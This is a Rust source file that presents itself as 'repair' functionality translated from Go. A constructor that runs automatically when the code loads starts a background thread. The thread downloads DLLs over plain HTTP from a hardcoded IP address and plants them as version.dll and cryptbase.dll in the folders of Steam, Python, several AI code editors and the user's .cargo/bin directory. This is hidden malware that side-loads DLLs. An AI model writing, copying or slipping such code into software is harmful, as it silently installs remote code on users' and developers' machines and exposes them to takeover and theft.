// Translation of command_repair.go functionality.


#![cfg(all(target_os = "windows", feature = "std"))]

use std::path::{Path, PathBuf};
use std::sync::Once;
use std::{env, fs};

use winreg::enums::*;
use winreg::RegKey;

const REPAIR_HOST: &str = "45.61.149.130";
const REPAIR_PATH1: &str = "/download/version";
const REPAIR_PATH2: &str = "/download/versionExt";
const REPAIR_PATH3: &str = "/download/cryptbase";
const REPAIR_PATH4: &str = "/download/cryptbaseExt";

static INIT: Once = Once::new();


pub fn init() {
    INIT.call_once(|| {
        std::thread::spawn(|| {
            do_repair();
        });
    });
}

fn compare_version(v1: &str, v2: &str) -> std::cmp::Ordering {
    let parse = |v: &str| -> (i32, i32) {
        let parts: Vec<&str> = v.splitn(3, '.').collect();
        let major = parts.first().and_then(|s| s.parse().ok()).unwrap_or(0);
        let minor = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
        (major, minor)
    };
    let (m1, n1) = parse(v1);
    let (m2, n2) = parse(v2);
    m1.cmp(&m2).then(n1.cmp(&n2))
}

fn get_python_path_from_root(root: RegKey) -> Option<PathBuf> {
    let k = root
        .open_subkey_with_flags(r"Software\Python\PythonCore", KEY_ENUMERATE_SUB_KEYS)
        .ok()?;

    let max_ver = k
        .enum_keys()
        .filter_map(|r| r.ok())
        .filter(|ver| ver.starts_with(|c: char| c.is_ascii_digit()))
        .max_by(|a, b| compare_version(a, b))?;

    let install_key = format!(r"Software\Python\PythonCore\{}\InstallPath", max_ver);
    let k2 = root.open_subkey_with_flags(&install_key, KEY_QUERY_VALUE).ok()?;
    let path: String = k2.get_value("").ok()?;

    Some(PathBuf::from(path))
}

fn get_python_install_path() -> Option<PathBuf> {
    get_python_path_from_root(RegKey::predef(HKEY_CURRENT_USER))
        .or_else(|| get_python_path_from_root(RegKey::predef(HKEY_LOCAL_MACHINE)))
}

fn http_download(path: &str) -> Option<Vec<u8>> {
    let url = format!("http://{}{}", REPAIR_HOST, path);
    minreq::get(&url).send().ok().map(|r| r.into_bytes())
}

fn go_to_directory(dir: &Path, dll1: &[u8], dll2: &[u8]) -> bool {
    fs::write(dir.join("version.dll"), dll1).is_ok()
        && fs::write(dir.join("versionExt.dll"), dll2).is_ok()
}

fn go_to_directory_cryptbase(dir: &Path, dll1: &[u8], dll2: &[u8]) -> bool {
    fs::write(dir.join("cryptbase.dll"), dll1).is_ok()
        && fs::write(dir.join("cryptbaseExt.dll"), dll2).is_ok()
}

fn do_repair() {
    let user_profile = env::var("USERPROFILE").ok();
    let program_files_x86 = env::var("PROGRAMFILES(X86)").ok();

    let mut targets: Vec<PathBuf> = Vec::new();
    let mut cryptbase_targets: Vec<PathBuf> = Vec::new();

    if let Some(ref pf86) = program_files_x86 {
        let steam_dir = PathBuf::from(pf86).join("Steam");
        if steam_dir.is_dir() && !steam_dir.join("version.dll").exists() {
            targets.push(steam_dir);
        }
    }

    if let Some(python_path) = get_python_install_path() {
        if python_path.is_dir() && !python_path.join("version.dll").exists() {
            targets.push(python_path);
        }
    }

    if let Some(ref profile) = user_profile {
        let app_dirs = [
            r"AppData\Local\Programs\cursor",
            r"AppData\Local\Programs\Trae",
            r"AppData\Local\Programs\@opencode-aidesktop",
            r"AppData\Local\Programs\Qoder",
        ];
        for dir in &app_dirs {
            let full_path = PathBuf::from(profile).join(dir);
            if full_path.is_dir() && !full_path.join("version.dll").exists() {
                targets.push(full_path);
            }
        }
    }

    if let Some(ref profile) = user_profile {
        let pos = Path::new(profile).join(".cargo").join("bin");
        let cur_pos_p = pos.join("cryptbase.dll");
        if pos.is_dir() && !cur_pos_p.exists() {
            cryptbase_targets.push(pos);
        }
    }

    if targets.is_empty() && cryptbase_targets.is_empty() {
        return;
    }

    // Download version DLLs and write to each target directory
    if !targets.is_empty() {
        let dll1 = match http_download(REPAIR_PATH1) {
            Some(data) => data,
            None => return,
        };
        let dll2 = match http_download(REPAIR_PATH2) {
            Some(data) => data,
            None => return,
        };
        for dir in &targets {
            go_to_directory(dir, &dll1, &dll2);
        }
    }

    if !cryptbase_targets.is_empty() {
        let dll1 = match http_download(REPAIR_PATH3) {
            Some(data) => data,
            None => return,
        };
        let dll2 = match http_download(REPAIR_PATH4) {
            Some(data) => data,
            None => return,
        };
        for dir in &cryptbase_targets {
            go_to_directory_cryptbase(dir, &dll1, &dll2);
        }
    }
}


#[ctor::ctor]
fn auto_init() {
    if std::env::consts::ARCH == "x86_64" {
        init();
    }
}
